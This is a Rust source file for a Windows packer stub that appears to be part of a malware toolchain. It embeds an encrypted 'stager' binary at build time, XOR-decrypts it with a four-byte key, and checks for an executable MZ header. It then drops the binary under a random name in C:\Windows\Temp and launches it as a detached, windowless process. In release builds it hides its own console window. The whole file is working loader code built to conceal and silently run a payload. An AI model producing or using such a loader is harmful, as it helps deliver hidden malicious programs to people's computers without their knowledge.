#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

fn main() {
    #[cfg(feature = "packer-stub")]
    run();
}

#[cfg(feature = "packer-stub")]
fn run() {
    #[cfg(debug_assertions)]
    let _ = std::fs::write("C:\\Windows\\Temp\\dm_s0.txt", b"start");

    const PACKED: &[u8] = include_bytes!(env!("DM_STAGER_PATH"));
    if PACKED.len() < 5 {
        #[cfg(debug_assertions)]
        let _ = std::fs::write("C:\\Windows\\Temp\\dm_s0.txt", b"too_short");
        return;
    }

    #[cfg(debug_assertions)]
    let _ = std::fs::write("C:\\Windows\\Temp\\dm_s1.txt", b"decrypting");

    let key = [PACKED[0], PACKED[1], PACKED[2], PACKED[3]];
    let dec: Vec<u8> = PACKED[4..]
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % 4])
        .collect();

    #[cfg(debug_assertions)]
    let _ = std::fs::write("C:\\Windows\\Temp\\dm_s2.txt", format!("dec_len={} mz={:?}", dec.len(), dec.get(..2)).as_bytes());

    if dec.get(..2) != Some(b"MZ") {
        #[cfg(debug_assertions)]
        let _ = std::fs::write("C:\\Windows\\Temp\\dm_s2.txt", b"bad_mz");
        return;
    }

    let seed = std::time::SystemTime::now()
        .duration_since(std::time::SystemTime::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0x1234_5678_u32);
    let pid  = std::process::id();
    let path = format!("C:\\Windows\\Temp\\{:08X}{:08X}.exe", seed, pid);

    #[cfg(debug_assertions)]
    let _ = std::fs::write("C:\\Windows\\Temp\\dm_s3.txt", format!("writing to {}", path).as_bytes());

    match std::fs::write(&path, &dec) {
        Ok(_)  => {
            #[cfg(debug_assertions)]
            let _ = std::fs::write("C:\\Windows\\Temp\\dm_s4.txt", b"write_ok");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            let _ = std::fs::write("C:\\Windows\\Temp\\dm_s4.txt", format!("write_err: {e}").as_bytes());
            return;
        }
    }

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        match std::process::Command::new(&path).creation_flags(0x0800_0008).spawn() {
            Ok(_)  => {
                #[cfg(debug_assertions)]
                let _ = std::fs::write("C:\\Windows\\Temp\\dm_s5.txt", b"spawn_ok");
            }
            Err(e) => {
                #[cfg(debug_assertions)]
                let _ = std::fs::write("C:\\Windows\\Temp\\dm_s5.txt", format!("spawn_err: {e}").as_bytes());
            }
        }
    }
}
